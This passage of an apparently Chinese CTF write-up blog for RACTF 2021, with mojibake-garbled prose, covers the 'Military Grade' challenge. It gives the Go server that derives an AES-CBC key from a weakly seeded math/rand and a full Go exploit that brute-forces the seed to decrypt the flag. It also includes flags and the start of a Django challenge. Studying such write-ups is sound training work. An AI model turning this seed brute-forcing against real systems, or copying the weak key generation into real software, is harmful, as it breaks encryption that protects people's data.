&lt;p>&lt;code>ractf{dj4ng0_lfi_rce_not_unintended}&lt;/code>&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://techsupportjosh.com/posts/ractf-emojibook/">wp&lt;/a>&lt;/p>
&lt;h2 id="webmilitary-grade">Web/Military Grade&lt;/h2>
&lt;blockquote>
&lt;p>Go is safe, right? That means my implementation of AES will be secure?&lt;/p>
&lt;/blockquote>
&lt;p>ç»™å‡ºäº†goæ–‡ä»¶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-go" data-lang="go">&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;bytes&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;crypto/aes&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;crypto/cipher&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;encoding/hex&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;log&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;math/rand&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;net/http&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;sync&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;time&amp;#34;&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">rawFlag&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;[REDACTED]&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">flagmu&lt;/span> &lt;span style="color:#75af00">sync&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Mutex&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">PKCS5Padding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">blockSize&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">after&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">padding&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">blockSize&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#75af00">blockSize&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">padtext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">bytes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Repeat&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">padding&lt;/span>&lt;span style="color:#111">)},&lt;/span> &lt;span style="color:#75af00">padding&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">padtext&lt;/span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">plaintext&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bKey&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bIV&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">blockSize&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">bPlaintext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">PKCS5Padding&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">plaintext&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#75af00">blockSize&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">plaintext&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCipher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bKey&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">ciphertext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bPlaintext&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">mode&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">cipher&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCBCEncrypter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bIV&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">mode&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">CryptBlocks&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bPlaintext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">hex&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">EncodeToString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">changer&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">ticker&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewTicker&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Millisecond&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">672&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">C&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#00a8c8">range&lt;/span> &lt;span style="color:#75af00">ticker&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Now&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">UnixNano&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#111">^&lt;/span>&lt;span style="color:#ae81ff">0x7FFFFFFFFEFFF000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Int63&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">BlockSize&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Lock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rawFlag&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">BlockSize&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Unlock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">handler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ResponseWriter&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">req&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Lock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fprint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Unlock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Challenge starting up&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">HandleFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">handler&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">go&lt;/span> &lt;span style="color:#75af00">changer&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fatal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ListenAndServe&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;:80&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯ä»¥çœ‹åˆ°flagè¢«AES CBCåŠ å¯†ï¼ŒåŠ å¯†æœ¬èº«æ²¡é—®é¢˜ï¼Œé—®é¢˜å‡ºåœ¨ç§å­ä¸Šï¼›ç§å­ç”Ÿæˆæ˜¯é &lt;code>rand.Seed(time.Now().UnixNano() &amp;amp; ^0x7FFFFFFFFEFFF000)&lt;/code>å®Œæˆï¼Œè¿™æ ·å¾—åˆ°çš„ç§å­å¾ˆå° å¯ä»¥è¢«æˆ‘ä»¬çˆ†ç ´å‡ºæ¥&lt;/p>
&lt;p>exp.go&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-go" data-lang="go">&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;span style="color:#f92672">import&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;math/rand&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;crypto/aes&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;crypto/cipher&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;encoding/hex&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;strings&amp;#34;&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">hextext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#d88200">&amp;#34;35e57017892d2c615ed057d20eeee56f82c7b02d2d1b7efed6944c3cc660c914&amp;#34;&lt;/span> &lt;span style="color:#75715e">// Encrypted Flag
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#f92672">:=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#f92672">&amp;lt;=&lt;/span>&lt;span style="color:#ae81ff">19777868&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">int64&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Int63&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">BlockSize&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCipher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">mode&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">cipher&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCBCDecrypter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">hex&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">DecodeString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">hextext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">flagBytes&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">mode&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">CryptBlocks&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flagBytes&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flagBytes&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Contains&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;ractf&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Flag: %s\n&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>ractf{int3rEst1ng_M4sk_paTt3rn}&lt;/code>&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://ctf.rip/write-ups/crypto/ractf-2021-military-grade/">wp&lt;/a>&lt;/p>
&lt;h2 id="websecret-store">Web/Secret Store&lt;/h2>
&lt;blockquote>
&lt;p>How many secrets could a secret store store if a store could store secrets?&lt;/p>
&lt;/blockquote>
&lt;p>æ³¨å†Œå’Œç™»å½•ä¹‹åå¯ä»¥é€šè¿‡apiè®¾ç½®ä¸€ä¸ªè‡ªå·±çš„secretï¼Œè®¾ç½®å¥½ä¹‹åè¿˜å¯ä»¥æ›´æ”¹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818040636796.png" alt="image-20210818040636796">&lt;/p>
&lt;p>ç»™å‡ºäº†æºç ï¼Œæ˜¯djangoæ¡†æ¶ï¼Œç”¨åˆ°äº†rest_frameworkï¼Œé¡µé¢çš„debugæ¨¡å¼è¿˜å¼€ç€ï¼Œæœ‰ä¸€ä¸ªåä¸ºsecretçš„app&lt;/p>
